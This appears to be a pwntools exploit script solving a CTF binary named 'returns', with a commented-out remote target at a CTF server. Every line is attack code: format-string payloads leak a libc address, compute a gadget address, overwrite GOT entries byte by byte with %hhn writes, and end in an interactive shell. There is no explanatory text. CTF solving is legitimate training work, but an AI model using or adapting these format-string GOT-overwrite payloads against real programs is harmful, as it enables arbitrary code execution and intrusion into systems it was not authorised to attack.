from pwn import *
s=process("./returns",env={"LD_PRELOAD":'./libc.so.6'})
#gdb.attach(s)
#s=remote("shell.actf.co",19307)
payload="%17$paa"+"%4198806c"+"%12$naaa"+p64(0)+p64(0x404018)
s.sendlineafter(" to return?",payload)
s.recvuntil("sell you a ")
leak=s.recv(14)
leak=int(leak,16)
base=leak-0x020740-240
s.recv()
print hex(leak)
system=base+0xf02a4
six=system&0xff
ho=str(bin(system&0xff00))
five=int(ho[:-8],2)
ho=str(bin(system&0xff0000))
four=int(ho[:-16],2)
ho=str(bin(system&0xff000000))
three=int(ho[:-24],2)
ho=str(bin(system&0xff00000000))
two=int(ho[:-32],2)
ho=str(bin(system&0xff0000000000))
one=int(ho[:-40],2)
#print hex(system)
#print hex(six)
print hex(five)
#print hex(four)
#print hex(three)
#print hex(two)
#print hex(one)
print len(str(five))
pay1="%"+str(six)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(six)))+p64(0x40404028)
s.sendline(pay1)
pay2="%"+str(five)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(five)))+p64(0x40404029)
s.sendline(pay2)
pay3="%"+str(four)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(four)))+p64(0x4040402a)
s.sendline(pay3)
pay4="%"+str(three)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(three)))+p64(0x4040402b)
s.sendline(pay4)
pay5="%"+str(two)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(two)))+p64(0x4040402c)
s.sendline(pay5)
pay6="%"+str(one)+"c"+"%11$hhnaaaaaaa"+"a"*(8-len(str(one)))+p64(0x4040402d)
s.sendline(pay6)
payload="%4198480c"+"%11$naa"+p64(0)+p64(0x404018)
s.sendline(payload)
s.interactive()
